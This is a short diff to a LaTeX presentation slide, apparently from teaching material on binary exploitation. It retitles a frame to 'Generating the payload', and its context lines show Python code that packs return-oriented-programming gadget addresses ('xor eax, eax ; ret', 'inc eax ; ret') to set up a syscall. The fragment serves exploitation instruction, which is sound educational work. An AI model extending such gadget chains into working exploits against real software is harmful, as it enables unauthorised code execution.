@@ -1,4 +1,4 @@
-\frametitle{Working example: Putting it together, init params, syscall}
+\frametitle{Generating the payload, init params, syscall}
     \begin{lstlisting}[style=code, language=python]
 p += pack('<I', 0x080506c0) # xor eax, eax ; ret
 p += pack('<I', 0x08082a9e) # inc eax ; ret
